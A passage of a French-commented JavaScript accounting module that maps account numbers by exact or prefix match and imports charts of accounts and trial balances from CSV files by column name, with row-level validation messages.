  // « 4 → 5 » écraserait tout le reste selon l'ordre du tableau, et personne ne saurait laquelle a
  // servi. Un préfixe traduit la TÊTE et garde la queue : 411001 par « 411 → 3411 » donne 3411001.
  function compteCorrespondant(table, compte) {
    const n = txt(compte);
    if (!n) return n;
    let choix = null;
    (Array.isArray(table) ? table : []).forEach(r => {
      const de = txt(r && r.de);
      if (!de || !txt(r && r.vers)) return;
      if (n !== de && !(r.prefixe && n.startsWith(de))) return;
      if (!choix || de.length > txt(choix.de).length) choix = r;
    });
    if (!choix) return n;
    const de = txt(choix.de), vers = txt(choix.vers);
    return n === de ? vers : vers + n.slice(de.length);
  }

  // Les lignes traduites. Le contrat des lignes plates (`account`, 9.1.0) et celui du livre
  // (`compte`) coexistent : on traduit celui que la ligne porte, sans jamais inventer l'autre.
  function appliquerCorrespondance(lignes, table) {
    const t = (Array.isArray(table) ? table : []).filter(r => txt(r && r.de) && txt(r && r.vers));
    const L = Array.isArray(lignes) ? lignes : [];
    if (!t.length) return { lignes: L.slice(), traduites: 0 };
    let traduites = 0;
    const out = L.map(l => {
      const cle = l && l.compte !== undefined ? 'compte' : 'account';
      const avant = txt(l && l[cle]);
      const apres = compteCorrespondant(t, avant);
      if (!avant || apres === avant) return l;
      traduites++;
      return { ...l, [cle]: apres };
    });
    return { lignes: out, traduites };
  }

  // ---------------------------------------------------------------- les deux imports CSV
  //
  // Par NOM de colonne, jamais par position (règle 6.8.0) : un plan exporté d'un autre logiciel n'a
  // pas les mêmes colonnes ni le même ordre, et aligner à l'aveugle met des libellés dans « Débit »
  // sans que rien ne plante.
  const normEntete = s => String(s || '').toLowerCase()
    .normalize('NFD').replace(/[̀-ͯ]/g, '')
    .replace(/[^a-z0-9]/g, '');
  function colonnesPar(tete, alias) {
    const out = {};
    tete.forEach((t, i) => {
      const n = normEntete(t);
      Object.keys(alias).forEach(k => { if (out[k] === undefined && alias[k].includes(n)) out[k] = i; });
    });
    return out;
  }

  function planDepuisCsv(rows) {
    const r = Array.isArray(rows) ? rows : [];
    if (!r.length) return { comptes: [], ignorees: [], motif: 'Le fichier est vide.' };
    const col = colonnesPar(r[0], {
      compte: ['compte', 'numero', 'numerodecompte', 'ncompte', 'code'],
      libelle: ['libelle', 'intitule', 'nom', 'designation'],
      nature: ['nature', 'type', 'classe'],
      parent: ['parent', 'rattachea', 'collectif']
    });
    if (col.compte === undefined || col.libelle === undefined) {
      return { comptes: [], ignorees: [], motif: 'Il faut au moins une colonne « Compte » et une colonne « Libellé ».' };
    }
    const comptes = [], ignorees = [], vus = new Set();
    r.slice(1).forEach((ligne, i) => {
      const n = String(ligne[col.compte] || '').trim();
      const lib = String(ligne[col.libelle] || '').trim();
      if (!n && !lib) return;                                  // ligne vide : on n'en parle pas
      if (!/^\d{1,12}$/.test(n)) { ignorees.push({ ligne: i + 2, motif: `« ${n || '(vide)'} » n'est pas un numéro de compte`, valeur: n }); return; }
      if (!lib) { ignorees.push({ ligne: i + 2, motif: `le compte ${n} n'a pas de libellé`, valeur: n }); return; }
      if (vus.has(n)) { ignorees.push({ ligne: i + 2, motif: `le compte ${n} figure deux fois`, valeur: n }); return; }
      vus.add(n);
      const nat = col.nature !== undefined ? normEntete(ligne[col.nature]) : '';
      comptes.push({
        compte: n, libelle: lib,
        nature: NATURES_COMPTE.includes(nat) ? nat : natureDeCompte(n),
        parent: col.parent !== undefined ? String(ligne[col.parent] || '').trim() || undefined : undefined,
        source: 'import'
      });
    });
    return { comptes, ignorees, motif: '' };
  }

  function balanceDepuisCsv(rows) {
    const r = Array.isArray(rows) ? rows : [];
    if (!r.length) return { lignes: [], ignorees: [], motif: 'Le fichier est vide.' };
    const col = colonnesPar(r[0], {
      compte: ['compte', 'numero', 'numerodecompte', 'ncompte', 'code'],
      libelle: ['libelle', 'intitule', 'nom', 'designation'],
      debit: ['debit', 'soldedebit', 'debiteur', 'soldedebiteur'],
      credit: ['credit', 'soldecredit', 'crediteur', 'soldecrediteur']
    });
    if (col.compte === undefined || col.debit === undefined || col.credit === undefined) {
      return { lignes: [], ignorees: [], motif: 'Il faut les colonnes « Compte », « Débit » et « Crédit ».' };
    }
    const lignes = [], ignorees = [];
    r.slice(1).forEach((ligne, i) => {
      const n = String(ligne[col.compte] || '').trim();
      if (!n) return;
      if (!/^\d{1,12}$/.test(n)) { ignorees.push({ ligne: i + 2, motif: `« ${n} » n'est pas un numéro de compte`, valeur: n }); return; }
      const d = nombreDepuisCsv(ligne[col.debit]), c = nombreDepuisCsv(ligne[col.credit]);
      if (!d && !c) return;                                    // un compte à zéro n'ouvre rien
      lignes.push({ compte: n, libelle: col.libelle !== undefined ? String(ligne[col.libelle] || '').trim() : '', debit: round3(d), credit: round3(c) });
    });
    return { lignes, ignorees, motif: '' };
  }

  return {
    round3, cleDePiece, csvDangereux, nombreDepuisCsv, dateDepuisCsv,
    ecritureValide, entreesDepuisCsv,
    entriesBalance, entriesByAccount,
    balanceDepuisLignes, grandLivreDepuisLignes,
    journalDepuisLignes, centralisateurDepuisLignes,
    lettrageDepuisLignes,
    // Le livre (9.2.0)
    LIVRE_FORMAT, STATUTS_ECRITURE, NATURES_COMPTE, SOURCES_ECRITURE, JOURNAUX_PAR_DEFAUT,
    natureDeCompte, livreVide, isValidLivre, livreVersionInconnue, assurerCompte,
    ajouterEcriture, validerEcriture, contrepasser, importerPaquet, piecesDepuisLignes,
    lettrer, delettrer, prochaineLettre, balanceOuverture, lignesDuLivre,
    planDepuisCsv, balanceDepuisCsv,
    // La saisie (9.3.0)
    premierDuMoisSuivant, ajouterMoisIso, sansAccents, soldeDeLignes, comptesQuiCorrespondent,
    modifierEcriture, supprimerEcriture, validerLot, extourner, chercherEcritures,
    guideValide, ecritureDepuisGuide, occurrencesAGenerer,
    correspondanceValide, compteCorrespondant, appliquerCorrespondance
  };
});
